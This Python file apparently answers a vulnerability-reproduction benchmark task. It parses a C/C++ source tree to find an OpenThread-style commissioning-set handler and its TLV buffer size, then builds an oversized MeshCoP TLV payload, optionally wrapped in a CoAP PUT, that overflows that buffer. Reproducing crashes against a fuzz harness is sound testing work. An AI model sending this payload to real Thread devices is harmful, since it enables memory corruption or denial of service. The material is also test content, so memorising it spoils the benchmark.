import os
import re
import tarfile
from typing import Dict, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        sources = self._load_sources(src_path)
        harness_text = self._find_harness_text(sources)

        consume, selector = self._infer_consumed_prefix_and_selector(harness_text)
        input_kind = self._infer_input_kind(harness_text)

        buf_size = self._infer_overflow_buffer_size(sources)
        ext_len = self._choose_ext_len(buf_size)

        payload = self._build_meshcop_payload(ext_len)

        if input_kind == "coap":
            payload = self._wrap_in_coap_commissioner_set(payload)

        if consume <= 0:
            return payload

        prefix = bytearray()
        prefix.append(selector & 0xFF)
        if consume > 1:
            prefix.extend(b"\x00" * (consume - 1))
        return bytes(prefix) + payload

    def _load_sources(self, src_path: str) -> Dict[str, str]:
        sources: Dict[str, str] = {}
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if not self._is_source_file(fn):
                        continue
                    p = os.path.join(root, fn)
                    try:
                        with open(p, "rb") as f:
                            data = f.read()
                        sources[os.path.relpath(p, src_path)] = data.decode("utf-8", "ignore")
                    except Exception:
                        continue
            return sources

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    name = m.name
                    if not self._is_source_file(name):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        sources[name] = data.decode("utf-8", "ignore")
                    except Exception:
                        continue
        except Exception:
            pass
        return sources

    def _is_source_file(self, name: str) -> bool:
        lower = name.lower()
        return lower.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx"))

    def _find_harness_text(self, sources: Dict[str, str]) -> str:
        # Prefer files with LLVMFuzzerTestOneInput referencing commissioning set handler
        candidates = []
        for path, text in sources.items():
            if "LLVMFuzzerTestOneInput" in text or re.search(r"\bint\s+main\s*\(", text):
                score = 0
                if "HandleCommissioningSet" in text:
                    score += 100
                if "CommissioningSet" in text:
                    score += 50
                if "coap" in text.lower():
                    score += 10
                if "fuzz" in path.lower() or "harness" in path.lower():
                    score += 20
                if score > 0:
                    candidates.append((score, path, text))

        if candidates:
            candidates.sort(reverse=True)
            return candidates[0][2]

        # Fallback: any file referencing HandleCommissioningSet
        for _, text in sources.items():
            if "HandleCommissioningSet" in text:
                return text
        return ""

    def _infer_input_kind(self, harness_text: str) -> str:
        t = harness_text
        if not t:
            return "payload"

        if "AppendUriPath" in t or "SetPayloadMarker" in t:
            return "payload"

        if re.search(r"\bAppend\s*\(\s*(?:aData|data)\s*,", t) or re.search(r"\bAppend\s*\(\s*(?:aData|data)\s*\+\s*\d+", t):
            return "payload"

        if "otCoapHandleUdpReceive" in t or "HandleUdpReceive" in t:
            return "coap"

        if re.search(r"\bInitFrom\s*\(\s*(?:aData|data)\b", t) or re.search(r"\bDeserialize\s*\(\s*(?:aData|data)\b", t):
            return "coap"

        return "payload"

    def _infer_consumed_prefix_and_selector(self, harness_text: str) -> Tuple[int, int]:
        if not harness_text:
            return 0, 0

        # Try to infer if payload is taken from data + N
        consume = 0
        for m in re.finditer(r"\b(?:aData|data)\s*\+\s*(\d+)\b", harness_text):
            try:
                n = int(m.group(1))
            except Exception:
                continue
            if 0 < n <= 16:
                consume = max(consume, n)

        # If there is a likely switch/selection, attempt to infer the selector value.
        selector = 0

        # Heuristic: find the first occurrence of call to HandleCommissioningSet and locate enclosing case label
        idx = harness_text.find("HandleCommissioningSet")
        if idx != -1:
            window_start = max(0, idx - 4000)
            window = harness_text[window_start:idx]
            # Prefer explicit data[0] comparisons near the call
            m = re.search(r"(?:aData|data)\s*\[\s*0\s*\]\s*==\s*(0x[0-9a-fA-F]+|\d+)", window)
            if m:
                selector = int(m.group(1), 0)
            else:
                # Find nearest preceding "case X:"
                case_iter = list(re.finditer(r"\bcase\s+(0x[0-9a-fA-F]+|\d+)\s*:", window))
                if case_iter:
                    selector = int(case_iter[-1].group(1), 0)

        return consume, selector

    def _collect_int_constants(self, sources: Dict[str, str]) -> Dict[str, int]:
        consts: Dict[str, int] = {}
        patterns = [
            r"^\s*#\s*define\s+(k[A-Za-z0-9_]+)\s+(0x[0-9a-fA-F]+|\d+)\b",
            r"\b(k[A-Za-z0-9_]+)\s*=\s*(0x[0-9a-fA-F]+|\d+)\b",
        ]
        for _, text in sources.items():
            for pat in patterns:
                for m in re.finditer(pat, text, re.MULTILINE):
                    name = m.group(1)
                    val_s = m.group(2)
                    try:
                        val = int(val_s, 0)
                    except Exception:
                        continue
                    if 0 <= val <= 1_000_000:
                        consts.setdefault(name, val)
        return consts

    def _infer_overflow_buffer_size(self, sources: Dict[str, str]) -> int:
        # Try to find HandleCommissioningSet() body and locate aMessage.Read(..., tlv.GetSize(), tlvBuffer)
        # then infer tlvBuffer array size.
        consts = self._collect_int_constants(sources)

        best_size: Optional[int] = None

        for _, text in sources.items():
            if "HandleCommissioningSet" not in text:
                continue
            bodies = self._extract_function_bodies(text, "HandleCommissioningSet")
            for body in bodies:
                arr_sizes = self._extract_uint8_array_sizes(body, consts)
                reads = self._extract_read_calls(body)
                for args in reads:
                    if len(args) < 3:
                        continue
                    length_expr = args[1]
                    dest_expr = args[2]
                    if "GetSize" not in length_expr and "getsize" not in length_expr.lower():
                        continue
                    dest_var = self._extract_identifier_from_expr(dest_expr)
                    if not dest_var:
                        continue
                    if dest_var in arr_sizes:
                        sz = arr_sizes[dest_var]
                        if sz is not None and sz > 0:
                            if best_size is None or sz < best_size:
                                best_size = sz

                # Also consider any array named tlvBuffer if present
                if best_size is None and "tlvBuffer" in arr_sizes and arr_sizes["tlvBuffer"]:
                    best_size = arr_sizes["tlvBuffer"]

        if best_size is None:
            # Default to MeshCoP::Tlv::kMaxSize typical value
            best_size = 257
        return int(best_size)

    def _choose_ext_len(self, buf_size: int) -> int:
        # extended TLV total size = 4 + ext_len
        # choose ext_len large enough to exceed buf_size, and also >= 256 for spec-conformance-ish.
        target = max(260, buf_size + 1)  # total TLV size
        ext_len = target - 4
        if ext_len < 256:
            ext_len = 256
        if ext_len > 0xFFFF:
            ext_len = 0xFFFF
        return ext_len

    def _build_meshcop_payload(self, ext_len: int) -> bytes:
        # Include a small valid-looking Commissioner Session ID TLV, then a large extended-length TLV.
        # Commissioner Session ID TLV type in Thread MeshCoP is commonly 0x0b (11), len 2.
        commissioner_session_id_tlv = bytes([0x0B, 0x02, 0x00, 0x01])

        # Large TLV: use Steering Data TLV type 0x08 (8) (commonly present in commissioner dataset).
        t = 0x08
        ext_header = bytes([t, 0xFF, (ext_len >> 8) & 0xFF, ext_len & 0xFF])
        value = b"A" * ext_len
        return commissioner_session_id_tlv + ext_header + value

    def _wrap_in_coap_commissioner_set(self, payload: bytes) -> bytes:
        # Minimal CoAP CON PUT with Uri-Path options "c" and "cs" and payload marker.
        # Header: Ver=1, Type=CON(0), TKL=0 => 0x40. Code=PUT(0x03). Message ID=0x0000.
        header = bytes([0x40, 0x03, 0x00, 0x00])
        # Options: Uri-Path (11) delta=11 len=1 => 0xB1 "c"
        opt1 = bytes([0xB1, 0x63])
        # Next Uri-Path (11) delta=0 len=2 => 0x02 "cs"
        opt2 = bytes([0x02, 0x63, 0x73])
        marker = b"\xFF"
        return header + opt1 + opt2 + marker + payload

    def _extract_function_bodies(self, text: str, func_name: str) -> list:
        bodies = []
        # Find occurrences of function name followed by '(' and then '{'
        for m in re.finditer(r"\b" + re.escape(func_name) + r"\b\s*\(", text):
            start = m.start()
            brace_pos = text.find("{", m.end())
            if brace_pos == -1:
                continue
            # Ensure it's not a declaration ending with ';' before '{' (unlikely, but)
            semi_pos = text.find(";", m.end(), brace_pos)
            if semi_pos != -1:
                continue
            body = self._extract_brace_block(text, brace_pos)
            if body:
                bodies.append(body)
        return bodies

    def _extract_brace_block(self, text: str, open_brace_idx: int) -> Optional[str]:
        if open_brace_idx < 0 or open_brace_idx >= len(text) or text[open_brace_idx] != "{":
            return None
        depth = 0
        i = open_brace_idx
        n = len(text)
        while i < n:
            c = text[i]
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    return text[open_brace_idx:i + 1]
            i += 1
        return None

    def _extract_uint8_array_sizes(self, body: str, consts: Dict[str, int]) -> Dict[str, Optional[int]]:
        # Returns var -> size int if evaluatable
        out: Dict[str, Optional[int]] = {}
        for m in re.finditer(r"\buint8_t\s+([A-Za-z_]\w*)\s*\[\s*([^\]]+?)\s*\]\s*;", body):
            var = m.group(1)
            expr = m.group(2).strip()
            out[var] = self._eval_c_int_expr(expr, consts)
        return out

    def _extract_read_calls(self, body: str) -> list:
        calls = []
        idx = 0
        while True:
            j = body.find(".Read(", idx)
            if j == -1:
                break
            k = j + len(".Read(")
            args_str, end = self._extract_paren_contents(body, k - 1)
            if args_str is not None:
                args = self._split_args(args_str)
                calls.append(args)
                idx = end
            else:
                idx = k
        return calls

    def _extract_paren_contents(self, text: str, open_paren_idx: int) -> Tuple[Optional[str], int]:
        # open_paren_idx points at '('
        if open_paren_idx < 0 or open_paren_idx >= len(text) or text[open_paren_idx] != "(":
            return None, open_paren_idx + 1
        depth = 0
        i = open_paren_idx
        n = len(text)
        start = open_paren_idx + 1
        while i < n:
            c = text[i]
            if c == "(":
                depth += 1
            elif c == ")":
                depth -= 1
                if depth == 0:
                    return text[start:i], i + 1
            i += 1
        return None, n

    def _split_args(self, args_str: str) -> list:
        args = []
        cur = []
        depth = 0
        i = 0
        n = len(args_str)
        in_s = False
        in_d = False
        while i < n:
            c = args_str[i]
            if c == "'" and not in_d:
                in_s = not in_s
                cur.append(c)
            elif c == '"' and not in_s:
                in_d = not in_d
                cur.append(c)
            elif in_s or in_d:
                cur.append(c)
            else:
                if c in "([{":
                    depth += 1
                    cur.append(c)
                elif c in ")]}":
                    depth = max(0, depth - 1)
                    cur.append(c)
                elif c == "," and depth == 0:
                    args.append("".join(cur).strip())
                    cur = []
                else:
                    cur.append(c)
            i += 1
        if cur:
            args.append("".join(cur).strip())
        return args

    def _extract_identifier_from_expr(self, expr: str) -> str:
        # Try to capture the last identifier token
        # Remove common casts and address-of
        e = expr.strip()
        e = re.sub(r"\breinterpret_cast\s*<[^>]+>\s*\(", "", e)
        e = re.sub(r"\bstatic_cast\s*<[^>]+>\s*\(", "", e)
        e = e.replace("&", " ")
        e = e.replace("*", " ")
        e = e.replace(")", " ")
        e = e.replace("(", " ")
        toks = re.findall(r"[A-Za-z_]\w*", e)
        if not toks:
            return ""
        return toks[-1]

    def _eval_c_int_expr(self, expr: str, consts: Dict[str, int]) -> Optional[int]:
        s = expr.strip()

        # Replace common sizeof(Tlv) patterns with 2 (typical MeshCoP TLV base header is 2 bytes)
        s = re.sub(r"sizeof\s*\(\s*[^)]*\bTlv\b[^)]*\)", "2", s)
        s = re.sub(r"sizeof\s*\(\s*[^)]*\bExtendedTlv\b[^)]*\)", "4", s)

        # Replace scope qualifiers
        s = s.replace("::", "_")

        # Map known symbol forms to numeric
        replacements = {
            "Tlv_kMaxSize": 257,
            "MeshCoP_Tlv_kMaxSize": 257,
            "ot_MeshCoP_Tlv_kMaxSize": 257,
            "Tlv_kMaxLength": 255,
            "MeshCoP_Tlv_kMaxLength": 255,
        }
        for k, v in replacements.items():
            s = re.sub(r"\b" + re.escape(k) + r"\b", str(v), s)

        # Replace known kConstants
        for name, val in consts.items():
            s = re.sub(r"\b" + re.escape(name) + r"\b", str(val), s)

        # Allow only safe characters
        if not re.fullmatch(r"[0-9xXa-fA-F\s\+\-\*\/\%\(\)\<\>\&\|\^]+", s):
            return None

        # Evaluate safely (very limited)
        try:
            val = eval(s, {"__builtins__": None}, {})
        except Exception:
            return None
        if not isinstance(val, int):
            return None
        if val < 0 or val > 10_000_000:
            return None
        return val